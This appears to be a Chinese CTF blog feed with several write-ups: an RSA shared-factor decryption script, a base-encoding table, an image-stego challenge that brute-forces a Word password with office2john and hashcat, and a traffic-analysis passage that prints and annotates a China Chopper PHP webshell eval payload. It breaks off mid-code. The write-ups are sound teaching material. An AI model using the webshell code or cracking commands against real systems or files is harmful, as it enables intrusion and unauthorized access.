class="number">27545937603751737248785220891735796468973329738076209144079921449967292572349424539010502287564030116831261268197384650511043068738911429169730640135947800885987171539267214611907687570587001933829208655100828045651391618089603288456570334500533178695238407684702251252671579371018651675054368606282524673369983034682330578308769886456335818733827237294570476853673552685361689144261552895758266522393004116017849397346259119221063821663280935820440671825601452417487330105280889520007917979115568067161590058277418371493228631232457972494285014767469893647892888681433965857496916110704944758070268626897045014782837</span></span><br><span class="line">c14 = <span class="number">14069112970608895732417039977542732665796601893762401500878786871680645798754783315693511261740059725171342404186571066972546332813667711135661176659424619936101038903439144294886379322591635766682645179888058617577572409307484708171144488708410543462972008179994594087473935638026612679389759756811490524127195628741262871304427908481214992471182859308828778119005750928935764927967212343526503410515793717201360360437981322576798056276657140363332700714732224848346808963992302409037706094588964170239521193589470070839790404597252990818583717869140229811712295005710540476356743378906642267045723633874011649259842</span></span><br><span class="line"></span><br><span class="line">n15 = <span class="number">25746162075697911560263181791216433062574178572424600336856278176112733054431463253903433128232709054141607100891177804285813783247735063753406524678030561284491481221681954564804141454666928657549670266775659862814924386584148785453647316864935942772919140563506305666207816897601862713092809234429096584753263707828899780979223118181009293655563146526792388913462557306433664296966331469906428665127438829399703002867800269947855869262036714256550075520193125987011945192273531732276641728008406855871598678936585324782438668746810516660152018244253008092470066555687277138937298747951929576231036251316270602513451</span></span><br><span class="line">c15 = <span class="number">17344284860275489477491525819922855326792275128719709401292545608122859829827462088390044612234967551682879954301458425842831995513832410355328065562098763660326163262033200347338773439095709944202252494552172589503915965931524326523663289777583152664722241920800537867331030623906674081852296232306336271542832728410803631170229642717524942332390842467035143631504401140727083270732464237443915263865880580308776111219718961746378842924644142127243573824972533819479079381023103585862099063382129757560124074676150622288706094110075567706403442920696472627797607697962873026112240527498308535903232663939028587036724</span></span><br><span class="line"></span><br><span class="line">n16 = <span class="number">23288486934117120315036919418588136227028485494137930196323715336208849327833965693894670567217971727921243839129969128783853015760155446770590696037582684845937132790047363216362087277861336964760890214059732779383020349204803205725870225429985939570141508220041286857810048164696707018663758416807708910671477407366098883430811861933014973409390179948577712579749352299440310543689035651465399867908428885541237776143404376333442949397063249223702355051571790555151203866821867908531733788784978667478707672984539512431549558672467752712004519300318999208102076732501412589104904734983789895358753664077486894529499</span></span><br><span class="line">c16 = <span class="number">10738254418114076548071448844964046468141621740603214384986354189105236977071001429271560636428075970459890958274941762528116445171161040040833357876134689749846940052619392750394683504816081193432350669452446113285638982551762586656329109007214019944975816434827768882704630460001209452239162896576191876324662333153835533956600295255158377025198426950944040643235430211011063586032467724329735785947372051759042138171054165854842472990583800899984893232549092766400510300083585513014171220423103452292891496141806956300396540682381668367564569427813092064053993103537635994311143010708814851867239706492577203899024</span></span><br><span class="line"></span><br><span class="line">n17 = <span class="number">19591441383958529435598729113936346657001352578357909347657257239777540424811749817783061233235817916560689138344041497732749011519736303038986277394036718790971374656832741054547056417771501234494768509780369075443550907847298246275717420562375114406055733620258777905222169702036494045086017381084272496162770259955811174440490126514747876661317750649488774992348005044389081101686016446219264069971370646319546429782904810063020324704138495608761532563310699753322444871060383693044481932265801505819646998535192083036872551683405766123968487907648980900712118052346174533513978009131757167547595857552370586353973</span></span><br><span class="line">c17 = <span class="number">3834917098887202931981968704659119341624432294759361919553937551053499607440333234018189141970246302299385742548278589896033282894981200353270637127213483172182529890495903425649116755901631101665876301799865612717750360089085179142750664603454193642053016384714515855868368723508922271767190285521137785688075622832924829248362774476456232826885801046969384519549385428259591566716890844604696258783639390854153039329480726205147199247183621535172450825979047132495439603840806501254997167051142427157381799890725323765558803808030109468048682252028720241357478614704610089120810367192414352034177484688502364022887</span></span><br><span class="line"></span><br><span class="line">n18 = <span class="number">19254242571588430171308191757871261075358521158624745702744057556054652332495961196795369630484782930292003238730267396462491733557715379956969694238267908985251699834707734400775311452868924330866502429576951934279223234676654749272932769107390976321208605516299532560054081301829440688796904635446986081691156842271268059970762004259219036753174909942343204432795076377432107630203621754552804124408792358220071862369443201584155711893388877350138023238624566616551246804054720492816226651467017802504094070614892556444425915920269485861799532473383304622064493223627552558344088839860178294589481899206318863310603</span></span><br><span class="line">c18 = <span class="number">6790553533991297205804561991225493105312398825187682250780197510784765226429663284220400480563039341938599783346724051076211265663468643826430109013245014035811178295081939958687087477312867720289964506097819762095244479129359998867671811819738196687884696680463458661374310994610760009474264115750204920875527434486437536623589684519411519100170291423367424938566820315486507444202022408003879118465761273916755290898112991525546114191064022991329724370064632569903856189236177894007766690782630247443895358893983735822824243487181851098787271270256780891094405121947631088729917398317652320497765101790132679171889</span></span><br><span class="line"></span><br><span class="line">n19 = <span class="number">26809700251171279102974962949184411136459372267620535198421449833298448092580497485301953796619185339316064387798092220298630428207556482805739803420279056191194360049651767412572609187680508073074653291350998253938793269214230457117194434853888765303403385824786231859450351212449404870776320297419712486574804794325602760347306432927281716160368830187944940128907971027838510079519466846176106565164730963988892400240063089397720414921398936399927948235195085202171264728816184532651138221862240969655185596628285814057082448321749567943946273776184657698104465062749244327092588237927996419620170254423837876806659</span></span><br><span class="line">c19 = <span class="number">386213556608434013769864727123879412041991271528990528548507451210692618986652870424632219424601677524265011043146748309774067894985069288067952546139416819404039688454756044862784630882833496090822568580572859029800646671301748901528132153712913301179254879877441322285914544974519727307311002330350534857867516466612474769753577858660075830592891403551867246057397839688329172530177187042229028685862036140779065771061933528137423019407311473581832405899089709251747002788032002094495379614686544672969073249309703482556386024622814731015767810042969813752548617464974915714425595351940266077021672409858645427346</span></span><br><span class="line"></span><br><span class="line">n = [n0, n1, n2, n3, n4, n5, n6, n7, n8, n9, n10, n11, n12, n13, n14, n15, n16, n17, n18, n19]</span><br><span class="line">c = [c0, c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11, c12, c13, c14, c15, c16, c17, c18, c19]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(n)):</span><br><span class="line">        <span class="keyword">if</span> i != j:</span><br><span class="line">            <span class="keyword">if</span> gmpy2.gcd(n[i], n[j]) != <span class="number">1</span>:</span><br><span class="line">                p = gmpy2.gcd(n[i], n[j])</span><br><span class="line">                q = n[i] // p</span><br><span class="line">                d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">                m = <span class="built_in">pow</span>(c[i], d, n[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m))) <span class="comment"># flag&#123;abdcbe5fd94e23b3de429223ab9c2fdf&#125;</span></span><br></pre></td></tr></table></figure><h2 id="5-Base-家族编码"><a href="#5-Base-家族编码" class="headerlink" title="5.Base 家族编码"></a>5.Base 家族编码</h2><table><thead><tr><th>Base</th><th>描述</th><th>等号填充情况</th></tr></thead><tbody><tr><td>base16</td><td>大写字母（<code>A-Z</code>）和数字（<code>0-9</code>）</td><td>通常不需要“&#x3D;”填充</td></tr><tr><td>base32</td><td>大写字母（<code>A-Z</code>）和数字（<code>2-7</code>）</td><td>需要“&#x3D;”填充</td></tr><tr><td>base64</td><td>大小写字母（<code>a-Z</code>）和数字（<code>0-9</code>）以及特殊字符（<code>+</code>,<code>/</code>）</td><td>不满 3 的倍数用“&#x3D;”补齐</td></tr><tr><td>base58</td><td>同 base64 相比，少了数字<code>0</code>和字母<code>O</code>数字<code>1</code>和字母<code>I</code>以及<code>+</code>和<code>/</code>符号</td><td>没有“&#x3D;”</td></tr><tr><td>base85</td><td>有很多奇怪的符号</td><td>一般没有“&#x3D;”</td></tr><tr><td>base91</td><td>由 91 个字符（<code>0-9</code>，<code>a-z</code>，<code>A-Z</code>,A-Z,!#$%&amp;()*+,.&#x2F;:;&lt;&#x3D;&gt;?@[]^_&#96;{  }~”）与运算符 组成</td><td>有“＝”</td></tr><tr><td>base100</td><td>全是 <code>emoji</code> 表情。</td><td>没有“&#x3D;”</td></tr></tbody></table><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://ctf-wiki.org/crypto/classical/polyalphabetic/">多表代换加密</a></li><li><a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_theory/">RSA 介绍</a></li><li><a href="https://blog.csdn.net/qq_45521281/article/details/114706622">RSA 算法原理及 CTF 解题</a></li><li><a href="https://www.secpulse.com/archives/197505.html">CTF 中 RSA 常见攻击方法</a></li></ul>]]></content>
    
    
    <summary type="html">CTF比赛中，古典密码，DES算法，梅森旋转算法</summary>
    
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/tags/CTF/"/>
    
    <category term="密码学" scheme="https://www.bandao.ltd/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    <category term="算法" scheme="https://www.bandao.ltd/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>【CTF】Misc图片处理题：ACTF wanna png</title>
    <link href="https://www.bandao.ltd/CTF/Misc/image_processing_1.html"/>
    <id>https://www.bandao.ltd/CTF/Misc/image_processing_1.html</id>
    <published>2024-11-09T00:00:00.000Z</published>
    <updated>2024-11-11T18:44:34.080Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/assets/CTF/Misc/image_processing_1/ACTF_wanan.png" alt="image_processing_1"></p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ol><li>Binwalk 分离</li><li>盲水印</li><li>crypto 解密</li><li>hashcat 爆破</li><li>docx 隐藏文字</li><li>bmp 隐写</li></ol><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-Binwalk-分离"><a href="#1-Binwalk-分离" class="headerlink" title="1. Binwalk 分离"></a>1. Binwalk 分离</h3><p>拿到图片先进行 Binwalk 文件分析，可以看到有个 zip 压缩包，则 Binwalk 分离提取压缩包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1:PNG image, 440 x 449, 8-bit/color RGB, non-interlaced</span><br><span class="line">2:Zlib compressed data, compressed</span><br><span class="line">3:Zip archive data, at least v2.0 to extract, compressed size: 192868, uncompressed size: 205062, name: wanan.png</span><br><span class="line">4:End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure><h3 id="2-盲水印"><a href="#2-盲水印" class="headerlink" title="2. 盲水印"></a>2. 盲水印</h3><p>进入压缩包后有<code>wanan.png</code>和<code>舔狗日记.crypto</code>两个文件，仔细看则会发现两个图片几乎一样，则容易联想到可能是<strong>盲水印</strong>。<br>使用<a href="http://1o1o.xyz/bo_ctfcode.html">随波逐流工具箱</a>或者<code>BlindWaterMark</code>进行<strong>双图盲水印（key）解密</strong>，得到关键信息 1:<code>ARJXU4MjE0</code>。</p><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/chishaxie/BlindWaterMark"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=chishaxie&repo=BlindWaterMark&&show_owner=true"/></a></div><blockquote><p>wanan.png 为题目图片， wanan2.png 为解压后的图片。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python bwmforpy3.py decode wanan.png wanan2.png out.png</span><br></pre></td></tr></table></figure><p><img src="/assets/CTF/Misc/image_processing_1/ACTF_wanan_dbwm.png" alt="image_processing_1"></p><h3 id="3-crypto-解密"><a href="#3-crypto-解密" class="headerlink" title="3. crypto 解密"></a>3. crypto 解密</h3><p><code>.crypto</code>文件使用<code>Encrypto</code>打开，输入前面获取的<code>ARJXU4MjE0</code>，得到三个文件<code>舔狗日记1.docx</code>、<code>舔狗日记2.docx</code>、<code>最终我不想舔了.bmp</code>.</p><blockquote><p>word 需要配置打开隐藏文字的格式标记，否则后面无法展示隐藏文字。<br><img src="/assets/CTF/Misc/image_processing_1/1.png" alt="image_processing_1"></p></blockquote><p>打开<code>舔狗日记1.docx</code>，全选文字颜色加深，发现没有异常，使用 Binwalk 文件分析，发现有异常的<code>remember.zip</code>。</p><details class="tag-plugin colorful folding" color="light" child="codeblock"><summary><span>Binwalk 文件分析</span></summary><div class="body"><!-- folder Binwalk 分析 --><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">1:Zip archive data, at least v2.0 to extract, compressed size: 350, uncompressed size: 1432, name: [Content_Types].xml</span><br><span class="line">2:Zip archive data, at least v2.0 to extract, name: _rels/</span><br><span class="line">3:Zip archive data, at least v2.0 to extract, compressed size: 247, uncompressed size: 737, name: _rels/.rels</span><br><span class="line">4:Zip archive data, at least v2.0 to extract, name: customXml/</span><br><span class="line">5:Zip archive data, at least v2.0 to extract, name: customXml/_rels/</span><br><span class="line">6:Zip archive data, at least v2.0 to extract, compressed size: 188, uncompressed size: 296, name: customXml/_rels/item1.xml.rels</span><br><span class="line">7:Zip archive data, at least v2.0 to extract, compressed size: 149, uncompressed size: 258, name: customXml/item1.xml</span><br><span class="line">8:Zip archive data, at least v2.0 to extract, compressed size: 228, uncompressed size: 327, name: customXml/itemProps1.xml</span><br><span class="line">9:Zip archive data, at least v2.0 to extract, name: docProps/</span><br><span class="line">10:Zip archive data, at least v2.0 to extract, compressed size: 346, uncompressed size: 624, name: docProps/app.xml</span><br><span class="line">11:Zip archive data, at least v2.0 to extract, compressed size: 327, uncompressed size: 633, name: docProps/core.xml</span><br><span class="line">12:Zip archive data, at least v2.0 to extract, compressed size: 252, uncompressed size: 383, name: docProps/custom.xml</span><br><span class="line">13:Zip archive data, at least v2.0 to extract, compressed size: 162, uncompressed size: 224, name: remember.zip</span><br><span class="line">14:Zip archive data, at least v2.0 to extract, name: word/</span><br><span class="line">15:Zip archive data, at least v2.0 to extract, name: word/_rels/</span><br><span class="line">16:Zip archive data, at least v2.0 to extract, compressed size: 246, uncompressed size: 822, name: word/_rels/document.xml.rels</span><br><span class="line">17:Zip archive data, at least v2.0 to extract, compressed size: 3739, uncompressed size: 57660, name: word/document.xml</span><br><span class="line">18:Zip archive data, at least v2.0 to extract, compressed size: 682, uncompressed size: 3062, name: word/fontTable.xml</span><br><span class="line">19:Zip archive data, at least v2.0 to extract, compressed size: 1026, uncompressed size: 2629, name: word/settings.xml</span><br><span class="line">20:Zip archive data, at least v2.0 to extract, compressed size: 2328, uncompressed size: 26902, name: word/styles.xml</span><br><span class="line">21:Zip archive data, at least v2.0 to extract, name: word/theme/</span><br><span class="line">22:Zip archive data, at least v2.0 to extract, compressed size: 1339, uncompressed size: 6436, name: word/theme/theme1.xml</span><br></pre></td></tr></table></figure></div></details><p>将该 word 文件后缀改为<code>.zip</code>后解压，拿到<code>remember.zip</code>。解压，打开里面的<code>remember.txt</code>，获取关键信息 2：<code>那天，你告诉了我你最重要的8个数字，我记住了</code>。<br>从中获取关键信息 3：<code>8个数字</code></p><h3 id="4-hashcat-爆破"><a href="#4-hashcat-爆破" class="headerlink" title="4. hashcat 爆破"></a>4. hashcat 爆破</h3><p>打开<code>舔狗日记2.docx</code>，发现需要密码，再加上前面得知密码为 8 个数字。所以选择使用 hashcat 爆破 word 密码。<br>使用 hashcat 爆破前需要得到 hash 值，所以我们使用 <a href="http://www.openwall.com/john/j/john-1.8.0-jumbo-1.tar.gz">Office2john</a> 获取<code>舔狗日记2.docx</code>的 hash 值（文件路径不能有中文，需要改名）。</p><div class="tag-plugin ghcard"><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/openwall/john"><img src="https://github-readme-stats.xaoxuu.com/api/pin/?username=openwall&repo=john&&show_owner=true"/></a></div><p>在<code>john-1.8.0-jumbo-1\run</code>目录下执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python office2john.py <span class="number">2.</span>docx &gt; <span class="built_in">hash</span></span><br></pre></td></tr></table></figure><p>获取文件 <code>hash</code>，打开删除前面的<code>2.docx:</code>，得到 hash</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$office$*2007*20*128*16*e8acb3ffadb859fcd9c0f38906f5a9b5*dc0a3deef00efb5fcdc115daa4784734*f97102e56fc53cf48fedba9a927e149d711928b2</span><br></pre></td></tr></table></figure><p>可以看到是 2007 版本 office。</p><p>在 hashcat 文件夹下执行<code>.\hashcat.exe --help | findstr Office</code>，获得 office 的 Hash modes。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> 9400 | MS Office 2007                                             | Document</span><br><span class="line"> 9500 | MS Office 2010                                             | Document</span><br><span class="line"> 9600 | MS Office 2013                                             | Document</span><br><span class="line">25300 | MS Office 2016 - SheetProtection                           | Document</span><br><span class="line"> 9700 | MS Office &lt;= 2003 <span class="variable">$0</span>/<span class="variable">$1</span>, MD5 + RC4                         | Document</span><br><span class="line"> 9710 | MS Office &lt;= 2003 <span class="variable">$0</span>/<span class="variable">$1</span>, MD5 + RC4, collider <span class="comment">#1            | Document</span></span><br><span class="line"> 9720 | MS Office &lt;= 2003 <span class="variable">$0</span>/<span class="variable">$1</span>, MD5 + RC4, collider <span class="comment">#2            | Document</span></span><br><span class="line"> 9810 | MS Office &lt;= 2003 <span class="variable">$3</span>, SHA1 + RC4, collider <span class="comment">#1              | Document</span></span><br><span class="line"> 9820 | MS Office &lt;= 2003 <span class="variable">$3</span>, SHA1 + RC4, collider <span class="comment">#2              | Document</span></span><br><span class="line"> 9800 | MS Office &lt;= 2003 <span class="variable">$3</span>/<span class="variable">$4</span>, SHA1 + RC4                        | Document</span><br></pre></td></tr></table></figure><p><code>2007</code>对应<code>9400</code>的 hash 类型，使用 <a href="https://blog.csdn.net/qq_39150356/article/details/135980077">hashcat 爆破</a>，得到关键信息 4：<code>19990821</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat.exe -m 9400 <span class="built_in">hash</span> -a 3 ?d?d?d?d?d?d?d?d -w 3 -O</span><br></pre></td></tr></table></figure><p><img src="/assets/CTF/Misc/image_processing_1/2.png" alt="image_processing_1"></p><blockquote><p>hashcat 同一个文件如果执行过的会保存记录，需要加<code>--show</code>展示密码</p></blockquote><h3 id="5-docx-隐藏文字"><a href="#5-docx-隐藏文字" class="headerlink" title="5. docx 隐藏文字"></a>5. docx 隐藏文字</h3><p>输入密码后，打开<code>舔狗日记2.docx</code>，全选文字，并且加深后，会发现出现隐藏文字，关键信息 5：<code>HowCaniForgetyou</code>。</p><p><img src="/assets/CTF/Misc/image_processing_1/3.png" alt="image_processing_1"></p><h3 id="6-bmp-隐写"><a href="#6-bmp-隐写" class="headerlink" title="6. bmp 隐写"></a>6. bmp 隐写</h3><p>还有一个 bmp 文件<code>最终我不想舔了.bmp</code>没有用到，推测为 <strong>bmp 隐写</strong>，我们使用软件<code>wbStego4.3open</code>，输入图片路径和密码，得到 txt 文件， 里面为最后的 flag：<code>ACTF&#123;Tr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve&#125;</code>。</p><blockquote><p>此 flag：<code>Tr1edT0f0rgeTy0uBuTf1nallyTurnsT0f0rg1ve</code>为 Leet speak 加密，解密为<code>TriedToForgetYouButFinallyTurnsToForgive</code>，意为<code>尝试忘记你，但最终选择原谅</code>。</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://cloud.tencent.com/developer/article/2272847">ACTF2020 部分 wp</a></li><li><a href="https://blog.csdn.net/qq_39150356/article/details/135980077">HashCat 恢复 Excel、Word、PPT 密码保姆教程</a></li></ul>]]></content>
    
    
    <summary type="html">用Binwalk 分离出一张一样的图片然后用盲水印得crypto文件密钥，word解压拿到关键信息8个数字，用hashcat爆破密码拿到docx隐藏密钥，破解bmp隐写得到flag。</summary>
    
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/tags/CTF/"/>
    
    <category term="Misc" scheme="https://www.bandao.ltd/tags/Misc/"/>
    
    <category term="图片处理" scheme="https://www.bandao.ltd/tags/%E5%9B%BE%E7%89%87%E5%A4%84%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>【CTF】EIS 2019 webshell</title>
    <link href="https://www.bandao.ltd/CTF/Misc/traffic_analysis_2.html"/>
    <id>https://www.bandao.ltd/CTF/Misc/traffic_analysis_2.html</id>
    <published>2024-11-08T00:00:00.000Z</published>
    <updated>2024-11-12T02:56:41.833Z</updated>
    
    <content type="html"><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ol><li>Wireshark 流量分析</li><li>Php 代码分析</li><li>Hex 转写 Jpg</li><li>zip 文件头</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;考点&quot;&gt;&lt;a href=&quot;#考点&quot; class=&quot;headerlink&quot; title=&quot;考点&quot;&gt;&lt;/a&gt;考点&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;Wireshark 流量分析&lt;/li&gt;
&lt;li&gt;Php 代码分析&lt;/li&gt;
&lt;li&gt;Hex 转写 Jpg&lt;/li&gt;
&lt;li&gt;zi</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://www.bandao.ltd/tags/CTF/"/>
    
    <category term="流量分析" scheme="https://www.bandao.ltd/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    <category term="Misc" scheme="https://www.bandao.ltd/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>【CTF】Misc流量分析题：功夫再高也怕菜刀，全网最全解析</title>
    <link href="https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html"/>
    <id>https://www.bandao.ltd/CTF/Misc/traffic_analysis_1.html</id>
    <published>2024-11-08T00:00:00.000Z</published>
    <updated>2024-11-11T18:41:51.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ol><li>Wireshark 流量分析</li><li>Php 代码分析</li><li>Hex 转写 Jpg</li><li>zip 文件头</li></ol><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="1-Wireshark-流量分析"><a href="#1-Wireshark-流量分析" class="headerlink" title="1. Wireshark 流量分析"></a>1. Wireshark 流量分析</h3><p>使用 wireshark 打开 pcapng 文件，筛选 http 流量。</p><p><img src="/assets/CTF/Misc/traffic_analysis_1/1.png" alt="traffic_analysis_1"></p><p>点击文件 -&gt; 导出对象 -&gt; HTTP</p><p><img src="/assets/CTF/Misc/traffic_analysis_1/2.png" alt="traffic_analysis_1"></p><p><a href="https://www.runoob.com/http/http-content-type.html">Content Type</a> 选择 All Content-Types，然后点击全部保存，选择导出文件夹，导出全部 HTTP 流量。</p><blockquote><p>ALL Content-Types：所有的内容类型。<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/MIME_types#applicationoctet-stream">application&#x2F;octet-stream</a>：类型为字节流（二进制文件），浏览器默认方式为下载。<br><a href="https://blog.csdn.net/LiamHong_/article/details/136739860">application&#x2F;x-www-form-urlencoded</a>：将表单内容转化为一种能够通过 URL 传输的形式，将键和值对连结起来，形式接近于 URL 的查询字符串。<strong>在这个过程中，特定的字符被替换成 %XX 形式，其中 XX 是对应字符的 ASCII 码的十六进制表示，而空白则被替换成加号（+）</strong>。<br><a href="https://www.cnblogs.com/charling/p/3385014.html">text&#x2F;html</a>：内容是 html，浏览器在获取到这种文件时会自动调用 html 的解析器对文件进行相应的处理。</p></blockquote><p><img src="/assets/CTF/Misc/traffic_analysis_1/3.png" alt="traffic_analysis_1"></p><h3 id="2-php-代码分析"><a href="#2-php-代码分析" class="headerlink" title="2. php 代码分析"></a>2. php 代码分析</h3><div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>查看文件详情</span></summary><div class="body"><p>首先找到 1.php ，我们进行分析。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa=@<span class="keyword">eval</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%<span class="number">2</span>BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><ul><li>base64_decode：以下内容为 base64 编码</li><li>action：入侵行为，值经过了 base64 编码与 urlencode 编码，通过 CyberChef 双重解码（URL Decode, From Base64）后得到 php 代码格式化后如下</li></ul><p><img src="/assets/CTF/Misc/traffic_analysis_1/4.png" alt="traffic_analysis_1"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 关闭错误显示</span></span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除脚本执行的时间限制，允许脚本无限期运行</span></span><br><span class="line">@<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 关闭魔术引号，该功能会自动在字符串的引号前添加转义字符</span></span><br><span class="line">@<span class="title function_ invoke__">set_magic_quotes_runtime</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出开始分隔符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;-&gt;|&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取当前脚本的目录路径</span></span><br><span class="line"><span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$D</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果SCRIPT_FILENAME为空，则尝试使用PATH_TRANSLATED</span></span><br><span class="line">    <span class="variable">$D</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将目录路径添加到变量R，并添加制表符作为分隔</span></span><br><span class="line"><span class="variable">$R</span> = <span class="string">&quot;<span class="subst">&#123;$D&#125;</span>\t&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span 